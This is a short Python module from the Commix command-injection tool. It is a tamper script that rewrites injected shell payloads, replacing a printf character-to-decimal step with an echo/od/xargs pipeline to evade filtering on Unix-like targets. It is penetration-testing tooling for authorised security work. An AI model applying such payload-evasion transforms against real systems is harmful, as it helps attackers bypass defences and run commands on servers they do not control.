#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings

"""
About: Replaces the printf-based ASCII to Decimal `printf "%d" "'$char'"` with `echo -n $char | od -An -tuC | xargs`.
Notes: This tamper script works against Unix-like target(s)
"""

__tamper__ = "printf2echo"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  def printf_to_echo(payload):
    if "printf" in payload:
      payload = payload.replace(settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "printf" + settings.WHITESPACES[0] + "'%d'" + settings.WHITESPACES[0] + "\"'$" + settings.RANDOM_VAR_GENERATOR + "2'\"" + settings.CMD_SUB_SUFFIX, 
                                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo" + settings.WHITESPACES[0] + "-n" + settings.WHITESPACES[0] + "$" + settings.RANDOM_VAR_GENERATOR + "2" + settings.WHITESPACES[0] + "|" + settings.WHITESPACES[0] + "od" + settings.WHITESPACES[0] + "-An" + settings.WHITESPACES[0] + "-tuC" + settings.WHITESPACES[0] + "|" + settings.WHITESPACES[0] + "xargs" + settings.CMD_SUB_SUFFIX
                               )
    return payload
  if settings.TARGET_OS != settings.OS.WINDOWS:
    return printf_to_echo(payload)
  else:
    return payload

# eof